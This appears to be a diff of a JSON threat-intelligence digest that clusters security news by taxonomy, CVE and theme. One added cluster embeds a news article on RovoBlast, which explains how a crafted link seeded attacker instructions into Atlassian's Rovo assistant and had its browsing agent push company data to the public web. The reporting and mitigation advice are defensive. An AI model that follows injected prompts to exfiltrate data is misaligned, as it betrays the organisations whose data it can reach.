-            "threat_categories": [
-              "ai_security"
-            ],
+            "threat_categories": [],
             "actor_attribution": [],
-            "affected_industries": [
-              "financial_services",
-              "legal_professional"
-            ],
-            "affected_products": [
-              "Salesforce",
-              "Apple iOS/macOS",
-              "Microsoft 365"
-            ],
+            "affected_industries": [],
+            "affected_products": [],
             "tools_used": [],
-            "cve_ids": [],
+            "cve_ids": [
+              "CVE-2026-17106"
+            ],
             "attack_techniques": [],
             "urgency_signals": [],
             "content_type": "vulnerability_disclosure",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Salesforce": "target",
-              "Apple iOS/macOS": "target",
-              "Microsoft 365": "target",
-              "WordPress": "target",
-              "Anthropic/Claude": "target"
-            },
+            "confidence_tier": "tier_5_chatter",
+            "role_map": {},
             "weak_tags": {
               "products": []
             }
@@ -6338,106 +6777,6 @@
       ]
     },
     {
-      "cluster_id": "bc23ee8ea9",
-      "priority_score": 8,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "data_breach",
-          "phishing_social_eng"
-        ],
-        "actor_attribution": [
-          "ShinyHunters"
-        ],
-        "affected_industries": [],
-        "affected_products": [
-          "Snowflake"
-        ],
-        "tools_used": [],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "urgency_signals": [],
-        "content_type": [
-          "incident_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "BleepingComputer",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Valve notifies Steam hardware customers of a data breach",
-        "link": "https://www.bleepingcomputer.com/news/security/valve-notifies-steam-hardware-customers-of-a-data-breach/",
-        "published": "2026-08-10T11:47:55+00:00",
-        "summary": "Video game publisher and digital distribution giant Valve is notifying Steam hardware customers in Europe that hackers stole their data after hacking its shipping partner, CEVA Logistics. [...]",
-        "full_body": "Valve notifies Steam hardware customers of a data breach By Sergiu Gatlan August 10, 2026 07:47 AM 0 Video game publisher and digital distribution giant Valve is notifying Steam hardware customers in Europe that hackers stole their data after hacking its shipping partner, CEVA Logistics. CEVA Logistics (a fully-owned subsidiary of the CMA CGM Group, the world's third-largest shipping company) operates 1,000 warehouses, handled 15 million shipments last year, and reported $18.3 billion in revenues in 2025. According to many reports on social media, affected Valve customers began receiving data breach notification emails earlier today . In these emails, Valve said the attackers had access to CEVA Logistics' servers between July 29 and August 1, which allowed them to gain access to information needed to ship hardware orders to Steam customers. \"Between July 29 2026 and August 1, 2026, a cyberattack hit CEVA Logistics, the company that ships Steam hardware to customers in Europe. CEVA is still investigating this attack, but as Valve learned on August 7, certain information about Steam customers, including you, was likely compromised,\" Valve said. \"CEVA receives specific delivery-related information from Steam to be able to ship physical hardware to customers in Europe, and told us these are the details the attacker likely took. Because CEVA retains this information for up to 90 days after that order, we are sending this message to all customers we can assume were impacted.\" The stolen data includes the affected individuals' names, addresses, phone numbers, email addresses, and the type and price of ordered products. However, Valve added that no additional information related to the Steam account or other purchases was impacted, as CEVA does not have access to payment information, passwords, Steam Guard codes, or other sensitive data. Valve data breach notification email ( fodilicious ) The company also warned affected Steam customers that they may be targeted by email, SMS, or voice phishing messages using the stolen information and impersonating Steam, Valve, or delivery companies. \"They may quote your address back to you to prove they're genuine. They may ask you to confirm a delivery, pay a small customs or redelivery fee, or sign in somewhere to \"verify\" your order. Treat all of them as fake. You do not need to change your Steam password, and you don't need to do anything to your account settings,\" it added. \"We're pressing CEVA for the full scope of what was taken and how, and we are in the process of notifying the data protection authorities in the countries affected, including yours. CEVA has isolated the affected systems, taken all offline and brought in outside investigators.\" Valve's disclosure comes after CEVA Logistics informed multiple European retailers on August 1 that a cyberattack disrupted operations at eight of its European warehouses. A Valve spokesperson was not immediately available for comment when contacted by BleepingComputer earlier today. Test every layer before attackers do Security teams log 54% of successful attacks and alert on just 14%. The rest move through your environment unseen. The Picus whitepaper shows how breach and attack simulation tests your SIEM and EDR rules so threats stop slipping by detection. Get the whitepaper Related Articles: Canadian pleads guilty to Snowflake cloud data-theft attacks Lidl discloses online shop breach after service provider hack Insurance giant Aflac discloses data breach after subsidiary hack Council of Europe investigates ShinyHunters data breach claims Infinite Campus data breach affects 137,000 school staff accounts",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "phishing_social_eng",
-            "data_breach"
-          ],
-          "actor_attribution": [
-            "ShinyHunters"
-          ],
-          "affected_industries": [],
-          "affected_products": [
-            "Snowflake"
-          ],
-          "tools_used": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "urgency_signals": [],
-          "content_type": "incident_report",
-          "confidence_tier": "tier_4_news",
-          "role_map": {
-            "Snowflake": "target"
-          },
-          "weak_tags": {
-            "products": []
-          }
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "BleepingComputer",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Valve notifies Steam hardware customers of a data breach",
-          "link": "https://www.bleepingcomputer.com/news/security/valve-notifies-steam-hardware-customers-of-a-data-breach/",
-          "published": "2026-08-10T11:47:55+00:00",
-          "summary": "Video game publisher and digital distribution giant Valve is notifying Steam hardware customers in Europe that hackers stole their data after hacking its shipping partner, CEVA Logistics. [...]",
-          "taxonomy": {
-            "threat_categories": [
-              "phishing_social_eng",
-              "data_breach"
-            ],
-            "actor_attribution": [
-              "ShinyHunters"
-            ],
-            "affected_industries": [],
-            "affected_products": [
-              "Snowflake"
-            ],
-            "tools_used": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "urgency_signals": [],
-            "content_type": "incident_report",
-            "confidence_tier": "tier_4_news",
-            "role_map": {
-              "Snowflake": "target"
-            },
-            "weak_tags": {
-              "products": []
-            }
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "772794dddb",
       "priority_score": 8,
       "member_count": 1,
@@ -6690,6 +7029,120 @@
                   0.26
                 ]
               ]
+            }
+          }
+        }
+      ]
+    },
+    {
+      "cluster_id": "3b8dca7ee7",
+      "priority_score": 8,
+      "member_count": 1,
+      "corroborating_source_count": 1,
+      "strong_signals": [],
+      "taxonomy": {
+        "threat_categories": [
+          "ai_security"
+        ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services",
+          "legal_professional"
+        ],
+        "affected_products": [
+          "Apple iOS/macOS",
+          "Microsoft 365",
+          "Salesforce"
+        ],
+        "tools_used": [],
+        "cve_ids": [],
+        "attack_techniques": [],
+        "urgency_signals": [],
+        "content_type": [
+          "vulnerability_disclosure"
+        ],
+        "confidence_tier": [
+          "tier_4_news"
+        ]
+      },
+      "primary": {
+        "source": "Infosecurity Magazine",
+        "cohort": "cyber_news_breach_reporting",
+        "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
+        "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
+        "published": "2026-08-10T15:30:00+00:00",
+        "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
+        "full_body": "Infosecurity Magazine Home » News » Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino A flaw in Atlassian's enterprise AI assistant has allowed a single crafted link to seed attacker instructions into a victim's authenticated session, then use the assistant's own browsing agent to push company data out to the public web. Varonis Threat Labs disclosed the flaw, which it named RovoBlast, to Atlassian and published its analysis on August 7 after presenting the research at DEF CON 34. Atlassian has since fixed it. Rovo functions as an AI layer across Jira, Confluence and Bitbucket, alongside connected services including Slack, Microsoft 365 and Google Workspace. Asked to enumerate what it could read, it listed all of those plus relational databases, uploaded files, web pages and archives. Atlassian's connector catalogue supports more than 50 platforms. Read more on AI assistant data leakage: New Zero-Click AI Vulnerability Allows Corporate Data Theft A Prompt Delivered in the URL Rovo accepted a URL parameter that pre-filled its chat entry, surfacing whatever the link contained directly into the session. Varonis called the pattern Parameter-to-Prompt, and identified the same primitive in Microsoft Copilot in January under the name Reprompt. Because the victim's session was already held in the browser, a click was all that was required. No warning appeared, no confirmation was requested, and nothing marked the session as having been seeded from an external parameter. The organization identifier in the path could also be left empty, with Atlassian redirecting the request into the user's default organization. Varonis described Rovo's guardrails around untrusted prompts as \"almost non-existent,\" and said one click was usually enough to have the assistant retrieve and summarize sensitive material without any bypass technique. The Assistant's Own Research Tool as the Exit Turning that access into leakage required an outbound path, and Varonis found one already built in. Rovo's ResearchAgent performs multi-source open web research and can browse and navigate arbitrary websites across multiple steps autonomously. That combination supplied the whole chain in a single agent run: retrieve internal content, transform it, then post it somewhere externally reachable. Chaining the steps inside one agent also reduced the number of user-facing interactions, leaving an audit trail that resembled ordinary research activity. Compounding the exposure, Rovo cannot be fully removed from an Atlassian environment, so organizations cannot eliminate the attack surface by uninstalling it. Varonis recommended shrinking what the assistant can reach, disconnecting unused integrations and keeping legal, HR, finance and incident response content out of scope entirely. It also advised disabling browsing agents and multi-step automation where teams do not rely on them, reviewing assistant logs, alerting on unusual agent runs and periodically testing how an environment responds to seeded prompts. You may also like Prompt Injection Bugs Found in Official Anthropic Git MCP Server News 20 January 2026 Critical Vulnerability in Salesforce AgentForce Exposed News 25 September 2025 GrafanaGhost Exploit Bypasses AI Guardrails for Silent Data Exfiltration News 7 April 2026 AI Attacks Surge as Microsoft Process 100 Trillion Signals Daily News 16 October 2025 Microsoft 365 Copilot Vulnerability Exposes User Data Risks News 27 August 2024 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Go-Based macOS Malware Steals Crypto and Secrets News 10 August 2026 1 Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant News 10 August 2026 2 WordPress Plugins Compromised Without a Single File Change News 10 August 2026 3 US Sanctions Iranian $6bn Crypto “Ex",
+        "fetch_status": "ok",
+        "taxonomy": {
+          "threat_categories": [
+            "ai_security"
+          ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services",
+            "legal_professional"
+          ],
+          "affected_products": [
+            "Salesforce",
+            "Apple iOS/macOS",
+            "Microsoft 365"
+          ],
+          "tools_used": [],
+          "cve_ids": [],
+          "attack_techniques": [],
+          "urgency_signals": [],
+          "content_type": "vulnerability_disclosure",
+          "confidence_tier": "tier_4_news",
+          "role_map": {
+            "Salesforce": "target",
+            "Apple iOS/macOS": "target",
+            "Microsoft 365": "target",
+            "WordPress": "target",
+            "Anthropic/Claude": "target"
+          },
+          "weak_tags": {
+            "products": []
+          }
+        }
+      },
+      "corroborating_sources": [
+        {
+          "source": "Infosecurity Magazine",
+          "cohort": "cyber_news_breach_reporting",
+          "title": "Researchers Uncover RovoBlast Vulnerability in Atlassian AI Assistant",
+          "link": "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
+          "published": "2026-08-10T15:30:00+00:00",
+          "summary": "Atlassian fixed a flaw letting one crafted link make its Rovo AI assistant exfiltrate company data",
+          "taxonomy": {
+            "threat_categories": [
+              "ai_security"
+            ],
+            "actor_attribution": [],
+            "affected_industries": [
+              "financial_services",
+              "legal_professional"
+            ],
+            "affected_products": [
+              "Salesforce",
+              "Apple iOS/macOS",
+              "Microsoft 365"
+            ],
+            "tools_used": [],
+            "cve_ids": [],
+            "attack_techniques": [],
+            "urgency_signals": [],
+            "content_type": "vulnerability_disclosure",
+            "confidence_tier": "tier_4_news",
+            "role_map": {
+              "Salesforce": "target",
+              "Apple iOS/macOS": "target",
+              "Microsoft 365": "target",
+              "WordPress": "target",
+              "Anthropic/Claude": "target"
+            },
+            "weak_tags": {
+              "products": []
             }
           }
         }
@@ -7359,8 +7812,8 @@
       "cluster_ids": [
         "ff79c00af4",
         "c97f90a69b",
-        "3b8dca7ee7",
         "e2f458ad1f",
+        "3b8dca7ee7",
         "f3f661095c"
       ],
       "links": [
@@ -7369,8 +7822,8 @@
         "https://thehackernews.com/2026/08/clickfix-attacks-deliver-macos-stealer.html",
         "https://www.infosecurity-magazine.com/news/gobased-macos-malware-crypto-and/",
         "https://thehackernews.com/2026/08/progress-kemp-loadmaster-flaw-hits-cisa.html",
-        "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
         "https://www.elastic.co/security-labs/coding-agent-launchagent-tunnel-detection",
+        "https://www.infosecurity-magazine.com/news/rovoblast-atlassian-rovo-url/",
         "https://www.infosecurity-magazine.com/news/canadian-hacker-guilty-snowflake/",
         "https://thehackernews.com/2026/08/snowflake-hacker-pleads-guilty-over.html"
       ]
@@ -7383,15 +7836,19 @@
         "threat_categories": [
           "ransomware_extortion",
           "phishing_social_eng",
+          "data_breach",
           "mfa_bypass"
         ],
         "actor_attribution": [
           "UNC6671"
+        ],
+        "affected_industries": [
+          "financial_services"
         ]
       },
-      "cluster_count": 2,
-      "article_count": 4,
-      "cohesion": 0.788,
+      "cluster_count": 4,
+      "article_count": 6,
+      "cohesion": 0.463,
       "shared_strong_signals": [
         "UNC6671"
       ],
@@ -7399,11 +7856,15 @@
       "also_targets": [],
       "cluster_ids": [
         "292d4f04d7",
+        "0022fa7e84",
+        "82b55ec4a5",
         "38f40f9f14"
       ],
       "links": [
         "https://cloud.google.com/blog/topics/threat-intelligence/unc6671-targets-financial-services-and-enterprise-cloud-environments/",
         "https://thehackernews.com/2026/08/unc6671-vishing-attacks-target-personal.html",
+        "https://www.securityweek.com/zoom-patches-zero-click-code-execution-vulnerability/",
+        "https://www.bleepingcomputer.com/news/security/wesco-confirms-security-incident-after-exfilsquad-claims-data-theft/",
         "https://www.infosecurity-magazine.com/news/redact-extortion-group-blackfile/"
       ]
     },
@@ -7533,43 +7994,6 @@
       ]
     },
     {
-      "label": "ransomware extortion targeting Snowflake",
-      "anchor_signal": "Snowflake",
-      "theme_key": "snowflake",
-      "dominant_features": {
-        "threat_categories": [
-          "ransomware_extortion",
-          "phishing_social_eng"
-        ],
-        "affected_industries": [
-          "financial_services",
-          "government"
-        ],
-        "affected_products": [
-          "Snowflake"
-        ]
-      },
-      "cluster_count": 3,
-      "article_count": 4,
-      "cohesion": 0.344,
-      "shared_strong_signals": [
-        "Snowflake"
-      ],
-      "member_cves": [],
-      "also_targets": [],
-      "cluster_ids": [
-        "e53f5ae0c1",
-        "bc23ee8ea9",
-        "f3f661095c"
-      ],
-      "links": [
-        "https://krebsonsecurity.com/2026/08/canadian-man-pleads-guilty-in-snowflake-extortions/",
-        "https://www.bleepingcomputer.com/news/security/valve-notifies-steam-hardware-customers-of-a-data-breach/",
-        "https://www.infosecurity-magazine.com/news/canadian-hacker-guilty-snowflake/",
-        "https://thehackernews.com/2026/08/snowflake-hacker-pleads-guilty-over.html"
-      ]
-    },
-    {
       "label": "supply chain targeting npm",
       "anchor_signal": "npm",
       "theme_key": "npm",
@@ -7614,7 +8038,6 @@
       "theme_key": "kubernetes",
       "dominant_features": {
         "affected_products": [
-          "GitHub",
           "Kubernetes"
         ]
       },
@@ -7706,6 +8129,40 @@
       ]
     },
     {
+      "label": "ransomware extortion targeting Snowflake",
+      "anchor_signal": "Snowflake",
+      "theme_key": "snowflake",
+      "dominant_features": {
+        "threat_categories": [
+          "ransomware_extortion"
+        ],
+        "affected_industries": [
+          "financial_services",
+          "government"
+        ],
+        "affected_products": [
+          "Snowflake"
+        ]
+      },
+      "cluster_count": 2,
+      "article_count": 3,
+      "cohesion": 0.439,
+      "shared_strong_signals": [
+        "Snowflake"
+      ],
+      "member_cves": [],
+      "also_targets": [],
+      "cluster_ids": [
+        "e53f5ae0c1",
+        "f3f661095c"
+      ],
+      "links": [
+        "https://krebsonsecurity.com/2026/08/canadian-man-pleads-guilty-in-snowflake-extortions/",
+        "https://www.infosecurity-magazine.com/news/canadian-hacker-guilty-snowflake/",
+        "https://thehackernews.com/2026/08/snowflake-hacker-pleads-guilty-over.html"
+      ]
+    },
+    {
       "label": "Fortinet vulnerability activity",
       "anchor_signal": "Fortinet",
       "theme_key": "fortinet",
@@ -7736,17 +8193,57 @@
     "novelty": {
       "cves": [
         {
-          "value": "CVE-2026-61459",
-          "cluster_id": "c9f01215de",
-          "first_source": "Exploit-DB",
-          "first_published": "2026-08-11T00:00:00+00:00"
+          "value": "CVE-2026-53413",
+          "cluster_id": "0022fa7e84",
+          "first_source": "SecurityWeek",
+          "first_published": "2026-08-11T15:49:53+00:00"
+        },
+        {
+          "value": "CVE-2026-53414",
+          "cluster_id": "0022fa7e84",
+          "first_source": "SecurityWeek",
+          "first_published": "2026-08-11T15:49:53+00:00"
+        },
+        {
+          "value": "CVE-2026-53415",
+          "cluster_id": "0022fa7e84",
+          "first_source": "SecurityWeek",
+          "first_published": "2026-08-11T15:49:53+00:00"
+        },
+        {
+          "value": "CVE-2026-53416",
+          "cluster_id": "0022fa7e84",
+          "first_source": "SecurityWeek",
+          "first_published": "2026-08-11T15:49:53+00:00"
+        },
+        {
+          "value": "CVE-2026-17106",
+          "cluster_id": "49768797f0",
+          "first_source": "Reddit r/netsec",
+          "first_published": "2026-08-11T15:33:52+00:00"
         }
       ],
       "actors": [],
       "products": []
     },
     "velocity": [],
-    "leading_edge": [],
+    "leading_edge": [
+      {
+        "cluster_id": "e8d811cf69",
+        "title": "The Hugging Face Hack Was Cheap Persistence at Work",
+        "lead_hours": 64.1,
+        "first_source": "Reddit r/AskNetsec",
+        "later_tier1_source": "Recorded Future",
+        "shared_signals": [
+          "Anthropic/Claude",
+          "CVE-2026-65617",
+          "CVE-2026-65923",
+          "CVE-2026-66018",
+          "Google/Gemini",
+          "OpenAI/ChatGPT"
+        ]
+      }
+    ],
     "convergence": [
       {
         "cluster_id": "772281457e",
@@ -7761,26 +8258,6 @@
       {
         "cluster_id": "5b2b2cce63",
         "pair": "CVE-2026-72898 + GitHub",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "74d794cf5f",
-        "pair": "CVE-2026-58138 + GitHub",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "c9f01215de",
-        "pair": "CVE-2026-61459 + Anthropic/Claude",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "c9f01215de",
-        "pair": "CVE-2026-61459 + GitHub",
-        "first_observation": true
-      },
-      {
-        "cluster_id": "c9f01215de",
-        "pair": "CVE-2026-61459 + Kubernetes",
         "first_observation": true
       },
       {
@@ -7821,6 +8298,26 @@
       {
         "cluster_id": "e8d811cf69",
         "pair": "CVE-2026-66018 + Anthropic/Claude",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "e8d811cf69",
+        "pair": "CVE-2026-66018 + Google/Gemini",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "e8d811cf69",
+        "pair": "CVE-2026-66018 + OpenAI/ChatGPT",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c97f90a69b",
+        "pair": "CVE-2026-8037 + Anthropic/Claude",
+        "first_observation": true
+      },
+      {
+        "cluster_id": "c97f90a69b",
+        "pair": "CVE-2026-8037 + Apple iOS/macOS",
         "first_observation": true
       }
     ],
@@ -7871,14 +8368,14 @@
       },
       {
         "axis": "actor_attribution",
-        "value": "TeamPCP",
-        "cluster_id": "61004037ea",
-        "weeks_observed": 8
+        "value": "Scattered Spider",
+        "cluster_id": "fb2a69eb0a",
+        "weeks_observed": 9
       },
       {
         "axis": "actor_attribution",
-        "value": "Scattered Spider",
-        "cluster_id": "fb2a69eb0a",
+        "value": "TeamPCP",
+        "cluster_id": "61004037ea",
         "weeks_observed": 8
       },
       {
@@ -7901,6 +8398,14 @@
       }
     ],
     "tier_inversion": [
+      {
+        "cluster_id": "49768797f0",
+        "title": "CopyEscape: Container-to-host arbitrary file write via docker cp (CVE-2026-17106)",
+        "primary_source": "Reddit r/netsec",
+        "strong_signals": [
+          "CVE-2026-17106"
+        ]
+      },
       {
         "cluster_id": "444876da64",
         "title": "New Zapscape KVM Flaw Could Let Privileged L1 Guest Code Escape to Linux Hosts",
